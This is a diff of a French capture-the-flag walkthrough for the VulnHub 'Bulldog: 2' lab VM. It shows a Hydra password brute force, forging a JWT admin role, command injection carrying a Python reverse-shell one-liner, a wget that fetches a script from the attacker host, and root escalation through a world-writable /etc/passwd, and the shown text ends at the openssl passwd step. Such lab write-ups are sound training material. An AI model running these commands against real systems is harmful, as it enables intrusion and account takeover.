@@ -1,6 +1,6 @@
 # Bulldog: 2
 
-[Bulldog: 2](https://www.vulnhub.com/entry/bulldog-2,246/) est une machine virtuelle vulnérable conçue par [le chercheur en sécurité Nick Frichette](https://frichetten.com/), et publiée au mois de juillet 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Il s'agit de la deuxième VM de la série Bulldog ; j'ai eu un réel plaisir à travailler sur la première VM Bulldog: 1, à la résoudre et à en rédiger l'article détaillé ([disponible sur ce Github]((/CTF-VulnLabs/bulldog1))). C'est parti pour ce nouveau _walkthrough_ ! Attention, spoilers...
+[Bulldog: 2](https://www.vulnhub.com/entry/bulldog-2,246/) est une machine virtuelle vulnérable, conçue par [le chercheur en sécurité Nick Frichette](https://frichetten.com/), et publiée sur VulnHub au mois de juillet 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Il s'agit de la deuxième VM de la série Bulldog ; j'ai eu un réel plaisir à travailler sur la première VM Bulldog: 1, à la résoudre et à en rédiger l'article détaillé ([disponible sur ce Github](/CTF-VulnLabs/bulldog1)). C'est parti pour ce nouveau _walkthrough_ ! Attention, spoilers...
 
 ## Synopsis
 
@@ -12,13 +12,12 @@ Contrairement au premier challenge où notre mission consistait à enquêter sur
 
 L'adresse IP de la VM Bulldog nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.101.
 
-Un scan [nmap](https://nmap.org/book/man.html#man-description) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation.
+Un scan [__nmap__](https://nmap.org/book/man.html#man-description) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- -A 192.168.56.101
 
-Host is up (0.0013s latency).
-Not shown: 65534 filtered ports
+--snip--
 PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.14.0 (Ubuntu)
 |_http-cors: HEAD GET POST PUT DELETE PATCH
@@ -31,25 +30,22 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
 Network Distance: 1 hop
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   1.28 ms 192.168.56.101
+--snip--
 ```
 
 Seul le port 80 est ouvert, il s'agit du site Web de _Bulldog.social_. Sa page d'accueil est notamment caractérisée par la ravissante photographie d'un bulldog anglais (probable clin d'oeil à leur business model précédent), dont on ne saurait dire s'il vous câlinera affectueusement ou vous pourchassera sans relâche à la moindre tentative de connexion au site. Le réseau social se targue d'avoir fédéré plus de 15000 membres en très peu de temps ; toutefois, les inscriptions au site sont fermées... tiens tiens, en raison de problèmes de sécurité ! _"Unfortunately we are not accepting registrations at this time due to security concerns. If needed, please reach out to a customer support representative to create a commercial account."_
 
 ![Affichage de l'image bulldog.jpg](images/bulldog.jpg)
 
-Un message de Winston Churchy a été publié sur la page "About us". Le PDG revient sur l'incident de sécurité dont a été victime _Bulldog Industries_ trois années auparavant : une exfiltration de leur base de données, orchestrée par le gang des bergers allemands _German Shepherd Hack Team_, et qui a entraîné le licenciement de tout le personnel technique puis une cessation d'activités. Néanmoins, l'entreprise s'est donné un mal de chien pour rebondir et il n'y a pas photo (fini les photos !), _Bulldog Industries_ a depuis repris du poil de la bête, comme en témoignent les chiffres évoqués par Churchy.
+Un message de Winston Churchy a été publié sur la page ```About us```. Le PDG revient sur l'incident de sécurité dont a été victime _Bulldog Industries_ trois années auparavant : une exfiltration de leur base de données, orchestrée par le gang des bergers allemands _German Shepherd Hack Team_, et qui a entraîné le licenciement de tout le personnel technique puis une cessation d'activités. Néanmoins, l'entreprise s'est donné un mal de chien pour rebondir et il n'y a pas photo (fini les photos !), _Bulldog Industries_ a depuis repris du poil de la bête, comme en témoignent les chiffres évoqués par Churchy.
 
-Enfin, la rubrique "Users" met en lumière les membres les plus actifs du mois écoulé. Neuf _Bullies_ ont ainsi leur portrait sur ce Hall of Fame : Berna Phillips (lrberna), LeeAnn Pham (anleeann), Vijay Wells (eivijay), Tonia Andersen (eitonia), Adolpho Kirby (ipadolpho), Angelo Wood (dnangelo), Fabien Stevens (sffabian), Rudie Ramirez (mdrudie) et Margarette Roberts (srmargarette). Il s'agit là d'une véritable aubaine car, à défaut de pouvoir nous créer un compte sur le réseau social, nous avons en notre possession les noms de neuf comptes utilisateurs... et si cela se trouve, peut-être que l'un d'entre eux n'est pas protégé par un mot de passe robuste...
+Enfin, la rubrique ```Users``` met en lumière les membres les plus actifs du mois écoulé. Neuf _Bullies_ ont ainsi leur portrait sur ce Hall of Fame : Berna Phillips (lrberna), LeeAnn Pham (anleeann), Vijay Wells (eivijay), Tonia Andersen (eitonia), Adolpho Kirby (ipadolpho), Angelo Wood (dnangelo), Fabien Stevens (sffabian), Rudie Ramirez (mdrudie) et Margarette Roberts (srmargarette). Il s'agit là d'une véritable aubaine car, à défaut de pouvoir nous créer un compte sur le réseau social, nous avons en notre possession les noms de neuf comptes utilisateurs... et si cela se trouve, peut-être que l'un d'entre eux n'est pas protégé par un mot de passe robuste...
 
 ![Affichage de l'image top_monthly_users.png](images/top_monthly_users.png)
 
 ## Hydra - Le deuxième travail d'Hercule
 
-Lors d'une tentative de connexion avec le couple d'identifiants user1/password1, le serveur nous renvoie un code erreur _[401 Unauthorized](https://tools.ietf.org/html/rfc7235#section-3.1)_. Le but ici va être d'automatiser la recherche de logins/mots de passe valides avec l'outil [Hydra](http://sectools.org/tool/hydra/), en lui donnant les paramètres adéquats (format de la requête, liste de logins, liste de mots de passe, conditions d'arrêt/de succès).
+Lors d'une tentative de connexion avec le couple d'identifiants ```user1:password1```, le serveur nous renvoie un code erreur [_401 Unauthorized_](https://tools.ietf.org/html/rfc7235#section-3.1). Le but ici va être d'automatiser la recherche de logins/mots de passe valides avec l'outil [__Hydra__](http://sectools.org/tool/hydra/), en lui donnant les paramètres adéquats : format de la requête, liste de logins, liste de mots de passe, conditions d'arrêt/de succès...
 
 ```console
 POST /users/authenticate HTTP/1.1
@@ -78,16 +74,16 @@ X-Powered-By: Express
 Access-Control-Allow-Origin: *
 ```
 
-Neuf utilisateurs ont été trouvés sur le site Internet de _Bulldog.social_, autant se focaliser sur eux et essayer de trouver leur mot de passe. Le wiki [SkullSecurity](https://wiki.skullsecurity.org/Passwords) propose un large panel de dictionnaires : le premier à être utilisé (au nom particulièrement évocateur) est 500-worst-passwords.txt.
+Neuf utilisateurs ont été trouvés sur le site Internet de _Bulldog.social_, autant se focaliser sur eux et essayer de trouver leur mot de passe. Le wiki [SkullSecurity](https://wiki.skullsecurity.org/Passwords) propose un large panel de dictionnaires : le premier à être utilisé, au nom particulièrement évocateur, est ```500-worst-passwords.txt```.
 
 ```console
-root@blinils:/media/sf_share/bulldog2# hydra -v -V -L users.txt -P 500-worst-passwords.txt -s 80 192.168.56.101 http-post-form "/users/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Cookie: test:H=Content-Type: application/json:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://192.168.56.101/login:H=Connection: keep-alive" -w 2
+root@blinils:~# hydra -v -V -L users.txt -P 500-worst-passwords.txt -s 80 192.168.56.101 http-post-form "/users/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Cookie: test:H=Content-Type: application/json:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Referer: http\://192.168.56.101/login:H=Connection: keep-alive" -w 2
 
-<snip>
+--snip--
 
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 4500 login tries (l:9/p:500), ~282 tries per task
 
-<snip>
+--snip--
 
 [ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "123456" - 1 of 4500 [child 0] (0/0)
 [ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "password" - 2 of 4500 [child 1] (0/0)
@@ -96,26 +92,26 @@ root@blinils:/media/sf_share/bulldog2# hydra -v -V -L users.txt -P 500-worst-pas
 [ATTEMPT] target 192.168.56.101 - login "lrberna" - pass "1234" - 4 of 4500 [child 3] (0/0)
 [ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
 
-<snip>
+--snip--
 
 [80][http-post-form] host: 192.168.56.101   login: eivijay   password: 12345
 
-<snip>
+--snip--
 
 [80][http-post-form] host: 192.168.56.101   login: mdrudie   password: qwerty
 
-<snip>
+--snip--
 
 [STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)
 1 of 1 target successfully completed, 2 valid passwords found
 ```
 
-Deux mots de passe ont été trouvés : ceux des comptes de Vijay Wells (eivijay) et de Rudie Ramirez (mdrudie). Néanmoins, une fois connecté sur leur profil respectif, aucune interaction ne semble autorisée : il n'est pas possible de modifier le pseudo, l'adresse e-mail enregistrée ou encore l'avatar. Dommage, la piste de l'upload d'un webshell semblait la plus probable. Poursuivons les investigations sur le site !
+Deux mots de passe ont été trouvés : ceux des comptes de Vijay Wells (eivijay) et de Rudie Ramirez (mdrudie). Néanmoins, une fois connecté sur leur profil respectif, aucune interaction ne semble autorisée : il n'est pas possible de modifier le pseudo, l'adresse e-mail enregistrée ou encore l'avatar. Dommage, la piste de l'upload d'un _webshell_ semblait la plus probable. Poursuivons les investigations sur le site !
 
 ## Level up! avec les JSON Web Tokens
 
-L'analyse des échanges avec Burp, entre le navigateur et le serveur permet d'avancer : 
-un [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token) est créé avec les informations de l'utilisateur.
+L'analyse des échanges avec le proxy [__Burp__](https://support.portswigger.net/customer/portal/articles/1783055-configuring-your-browser-to-work-with-burp), entre le navigateur et le serveur permet d'avancer : 
+un [_JSON Web Token_](https://en.wikipedia.org/wiki/JSON_Web_Token) est créé avec les informations de l'utilisateur.
 
 ```console
 HTTP/1.1 200 OK
@@ -131,13 +127,13 @@ ETag: W/"1c6-/88f6kDSzIXKdTBvko4UfYEKWoY"
 {"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJSdWRpZSBSYW1pcmV6IiwiZW1haWwiOiJydWRpZXJhbWlyZXpAaGFwcHltYWlsLmNvbSIsInVzZXJuYW1lIjoibWRydWRpZSIsImF1dGhfbGV2ZWwiOiJzdGFuZGFyZF91c2VyIiwicmFuZCI6MjF9LCJpYXQiOjE1MzQ0MjQ4NjgsImV4cCI6MTUzNTAyOTY2OH0.MnCH5VJOwHO_7sweYwwmUajaXRul7pXqlANLOwW0p04","user":{"name":"Rudie Ramirez","username":"mdrudie","email":"rudieramirez@happymail.com","auth_level":"standard_user"}}
 ```
 
-Oh, intéressant ! Il semblerait qu'il faille modifier le paramètre _auth_level_ afin d'augmenter nos privilèges. Oui mais par quoi ? admin ? admin_user ? super_user ? La réponse se trouve en réalité dans l'un des fichiers JS, main.8b490782e52b9899e2a7.bundle.js, où à un endroit du code, la valeur _auth_level_ est comparée à _"master_admin_user"_.
+Oh, intéressant ! Il semblerait qu'il faille modifier le paramètre ```auth_level``` afin d'augmenter nos privilèges. Oui mais par quoi ? ```admin``` ? ```admin_user``` ? ```super_user``` ? La réponse se trouve en réalité dans l'un des fichiers JS, ```main.8b490782e52b9899e2a7.bundle.js```, où à un endroit du code, la valeur ```auth_level``` est comparée à ```master_admin_user```.
 
-Bingo, il suffit alors de modifier le token et les informations associées, à l'aide du site https://jwt.io par exemple. Une fois la valeur _auth_level_ modifiée, on obtient un token tout à fait différent, que l'on passe à Burp (NB : il faut cliquer au préalable sur Action > Do intercept > Response to this request) et bingo, nous sommes admin !
+Bingo, il suffit alors de modifier le token et les informations associées, à l'aide du site https://jwt.io par exemple. Une fois la valeur ```auth_level``` modifiée, on obtient un token tout à fait différent, que l'on passe à __Burp__ en ayant cliqué au préalable sur _Action_ > _Do intercept_ > _Response to this request_ et bingo, nous sommes admin !
 
 ![Affichage de l'image JSON_Web_tokens.png](images/JSON_Web_tokens.png)
 
-Prochaine étape : un Admin Dashboard ayant l'apparence d'un formulaire de login. Les couples d'identifiants trouvés plus tôt, à savoir eivijay/12345 et mdrudie/qwerty ne fonctionnant pas, il va falloir trouver autre chose. L'indice qui nous met la puce à l'oreille (itchy.. ça gratte !) est _Please authenticate with the Link+ CLI Tool to use Link+_. Une interface en ligne de commande ? Se pourrait-il qu'il s'agisse d'une injection de commandes ? Après quelques tests, la réponse est oui !
+Prochaine étape : un _Admin Dashboard_ ayant l'apparence d'un formulaire de login. Les couples d'identifiants trouvés plus tôt, à savoir ```eivijay:12345``` et ```mdrudie:qwerty``` ne fonctionnant pas, il va falloir trouver autre chose. L'indice qui nous met la puce à l'oreille (itchy.. ça gratte !) est _Please authenticate with the Link+ CLI Tool to use Link+_. Une interface en ligne de commande ? Se pourrait-il qu'il s'agisse d'une injection de commandes ? Après quelques tests, la réponse est oui !
 
 ![Affichage de l'image admin_dashboard.png](images/admin_dashboard.png)
 
@@ -153,7 +149,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 16:16:17.125170 IP blinils > 192.168.56.101: ICMP echo reply, id 3009, seq 2, length 64
 ```
 
-Un reverse shell avec Python a particulièrement bien fonctionné par la suite. ```nc -nlvp 12345``` sur notre machine, ```test|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'``` dans le champ _password_ et nous obtenons notre shell !
+Un _reverse shell_ avec Python a particulièrement bien fonctionné par la suite. ```nc -nlvp 12345``` sur notre machine, ```test|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'``` dans le champ ```password``` et nous obtenons notre shell !
 
 ```console
 root@blinils:~# nc -nlvp 12345
@@ -166,7 +162,7 @@ node@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$
 
 ## Bulldog ou Cerbère ? Le douzième travail d'Hercule
 
-Le script [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker) développé par Mike Czumak (@SecuritySift) va scanner un certain nombre d'éléments sur le serveur : configuration de la machine, version du noyau Linux, listing des utilisateurs et de leurs privilèges, fichiers aux droits trop permissifs... et renvoie à la fin du scan une liste d'exploits censés permettre une élévation de privilèges.
+Le script [__linuxprivchecker.py__](https://github.com/sleventyeleven/linuxprivchecker) développé par Mike Czumak (@SecuritySift) va scanner un certain nombre d'éléments sur le serveur : configuration de la machine, version du noyau Linux, listing des utilisateurs et de leurs privilèges, fichiers aux droits trop permissifs... et renvoie à la fin du scan une liste d'exploits censés permettre une élévation de privilèges.
 
 ```console
 node@bulldog2:/tmp$ wget -q http://192.168.56.102:1234/linuxprivchecker.py 
@@ -188,19 +184,14 @@ LINUX PRIVILEGE ESCALATION CHECKER
     bulldog2
 
 [+] Operating System
-    __________      .__  .__       .___              ________
-    \\______   \\__ __|  | |  |    __| _/____   ____   \\_____  \\
-    |    |  _/  |  \\  | |  |   / __ |/  _ \\ / ___\\   /  ____/
-    |    |   \\  |  /  |_|  |__/ /_/ (  <_> ) /_/  > /       \\
-    |______  /____/|____/____/\\____ |\\____/\\___  /  \\_______ \\
-    \\/                      \\/     /_____/           \\/
+    --snip--
     Author: Nick Frichette
     Twitter: @frichette_n
     Goal: Get root, read the flag in /root
     IP Address: \4{enp0s3}
     Have fun!
 
-<snip>
+--snip--
 
 [+] All users
     root:x:0:0:root:/root:/bin/bash
@@ -209,29 +200,7 @@ LINUX PRIVILEGE ESCALATION CHECKER
     sys:x:3:3:sys:/dev:/usr/sbin/nologin
     sync:x:4:65534:sync:/bin:/bin/sync
     games:x:5:60:games:/usr/games:/usr/sbin/nologin
-    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-    lxd:x:105:65534::/var/lib/lxd/:/bin/false
-    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-    pollinate:x:109:1::/var/cache/pollinate:/bin/false
-    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+    --snip--
     admin:x:1000:1004:admin:/home/admin:/bin/bash
     mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
     node:x:1001:1005:,,,:/home/node:/bin/bash
@@ -242,7 +211,7 @@ LINUX PRIVILEGE ESCALATION CHECKER
 [+] Current User ID
     uid=1001(node) gid=1005(node) groups=1005(node)
 
-<snip>
+--snip--
 
 [+] World Writable Files
     -rwxrwxrwx 1 root root 1754 Aug  5 21:44 /etc/passwd
@@ -250,12 +219,12 @@ LINUX PRIVILEGE ESCALATION CHECKER
     --w--w--w- 1 root root 0 Aug 16 14:54 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
     --w--w--w- 1 root root 0 Aug 16 14:54 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
    
-<snip>
+--snip--
 ```
 
-Magnifique, le fichier [/etc/passwd](https://fr.wikipedia.org/wiki/Passwd) est en lecture/écriture pour tout le monde ! Ordinairement, les mots de passe hashés de chaque compte Unix sont stockés dans le fichier [/etc/shadow](http://www.linux-france.org/article/sys/lame/html/x829.html), qui n'est accessible en lecture que par le compte root. Le fichier /etc/passwd, quant à lui, contient la liste des utilisateurs et leurs informations respectives (numéro d'identification, groupe associé, répertoire personnel...). Cependant, si un hash est présent dans /etc/passwd pour un utilisateur donné, il sera tout de même pris en compte par le système !
+Magnifique, le fichier [```/etc/passwd```](https://fr.wikipedia.org/wiki/Passwd) est en lecture/écriture pour tout le monde ! Ordinairement, les mots de passe hashés de chaque compte Unix sont stockés dans le fichier [```/etc/shadow```](http://www.linux-france.org/article/sys/lame/html/x829.html), qui n'est accessible en lecture que par le compte root. Le fichier ```/etc/passwd```, quant à lui, contient la liste des utilisateurs et leurs informations respectives (numéro d'identification, groupe associé, répertoire personnel...). Cependant, si un hash est présent dans ```/etc/passwd``` pour un utilisateur donné, il sera tout de même pris en compte par le système !
 
-Le but du jeu va alors consister à ajouter un compte dans /etc/passwd, à lui affecter des valeurs (UID, GID...) équivalentes à root ainsi qu'un mot de passe, et à se connecter avec !
+Le but du jeu va alors consister à ajouter un compte dans ```/etc/passwd```, à lui affecter des valeurs (UID, GID...) équivalentes à root ainsi qu'un mot de passe, et à se connecter avec !
 
 ```console
 node@bulldog2:/tmp$ openssl passwd -1 -salt blinils passblinils
